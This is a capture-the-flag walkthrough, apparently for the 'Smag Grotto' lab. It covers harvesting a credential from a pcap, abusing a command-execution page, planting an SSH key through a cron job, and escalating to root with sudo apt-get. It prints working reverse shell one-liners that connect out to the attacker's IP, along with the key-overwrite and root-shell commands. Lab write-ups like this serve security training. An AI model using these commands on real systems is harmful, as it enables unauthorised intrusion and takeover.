# recon
## nmap
```
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

## gobuster
- /mail/ : you will find `.pcap` file, download it and open it using Wireshark. 

As you can see, there is a http traffic with `POST /login.php`. The request body contain a user cerdential. 
```
POST /login.php HTTP/1.1
Host: development.smag.thm
User-Agent: curl/7.47.0
Accept: */*
Content-Length: 39
Content-Type: application/x-www-form-urlencoded

username=helpdesk&password=cH4nG3M3_n0w
HTTP/1.1 200 OK
Date: Wed, 03 Jun 2020 18:04:07 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Length: 0
Content-Type: text/html; charset=UTF-8
```
You can see that the password was correct+working since the HTTP response was 200 OK. Lastly, the request was sent to `development.smag.thm` which mean that we need to add this host name to our `/etc/hosts` to be able to access this site.


```console
echo "<ip> development.smag.thm" >> /etc/hosts
```
There are a few .php files on the site, `admin.php` and `login.php`. You will be redirected to `admin.php` after you login with the cerdential that we got from `.pcap` file


`admin.php` allows us to excute command on the server. but there is no way that we could see the result/output of the executed command. 


To check if `admin.php` works, we can `ping` to ping back to our Kali. On Kali we use tcpdump and listen for ping packets. if we got something on tcpdump then `admin.php` is working

on victim server
```console
$ ping <kali ip> -c 2
```
on kali
```console
$ sudo tcpdump -i tun0 icmp
```
# Foothold as www-data
It works!!! so now time to get foothold by excuting reverse shell! there are many payload which you can find on this [repo](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)


Some payloads didnt works. to check if it work or the payload is executed properly you can run
```
$ <payload> && ping <kali ip> -c 2
```
Megamos came up with this Idea, What it would do is, if the payload is sucsesfully then it will ping back to us. In this way we can tell if it works or not. Or you simply just try the payload and see if it connenct back to you netcet listner.

After many tries, these are 2 payload that we tried and work
```
php -r '$sock=fsockopen("10.8.14.151",6969);exec("/
bin/sh -i <&3 >&3 2>&3");'
```

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.14.151 6969 > /tmp/f
```

# Foothold as Jake
I tried `sudo -l` for list user's privileges or check aspecific command, but it asked for www-data's password so we need to look for another way. I remember that port 22 is open, I ran`locate *.pub` look for a ssh public key.


Then I ended up checking `crontab` and BINGO!!!
```console
$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   root	/bin/cat /opt/.backups/jake_id_rsa.pub.backup > /home/jake/.ssh/authorized_keys
```
The last cornjob looks really interesting, it `cat /opt/.backups/jake_id_rsa.pub.backup` and feed into `/home/jake/.ssh/authorized_keys`. and it does it every 1 min. So this mean that the `authorized_keys` is the content of `jake_id_rsa.pub.backup`

So there are 2 things we could do here,
1. copy the content of `jake_id_rsa.pub.backup` and create a new key on our kali with that content
2. create key on our kali and copy the content and replace the content of `jake_id_rsa.pub.backup` with our public key that we generate.
```console
$ cd /opt/.backups/
$ echo "my ssh key (id_rsa.pub)" > jake_id_rsa.pub.backup
```
You can pick, But just know that there is a draw back to the 2nd way to gain access as Jake. Jake original key would be gone and REAL Jake will not be able to connect to his server again.. which is bad right? since the victim will notice that there is something odd here. But you pick

Now ssh to victim server with ssh key!
```
kali@kali:~$ ssh jake@smagrotto.thm -i .ssh/id_rsa
The authenticity of host 'smagrotto.thm (10.10.243.223)' can't be established.
ECDSA key fingerprint is SHA256:MMv7NKmeLS/aEUSOLy0NbyGrLCEKErHJTp1cIvsxnpA.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'smagrotto.thm,10.10.243.223' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Last login: Fri Jun  5 10:15:15 2020
jake@smag:~$ cat user.txt # get user flag
```
# Root
So we will repeat the same process as when we try to gain access as Jake. Start with `sudo -l`
```console
jake@smag:~$ sudo -l
Matching Defaults entries for jake on smag:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on smag:
    (ALL : ALL) NOPASSWD: /usr/bin/apt-get
```
Seem like we are allow to run `/usr/bin/apt-get` as root and no password is required, This is perfect since we do not know Jake password. So let check [GTFObins](https://gtfobins.github.io/gtfobins/apt-get/), and this is our payload `sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh`

what `APT::Update::Pre-Invoke::={"your-command-here"}` does is, It allow us to execute a command before the **update** process is excute. To understand more you can read [this](https://unix.stackexchange.com/questions/204414/how-to-run-a-command-before-download-with-apt-get). In this case we are forcing `apt-get update` to execute `/bin/sh` before updating the server
```console
jake@smag:~$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
# whoami
root
# cat /root/root.txt
```
GL and happy hacking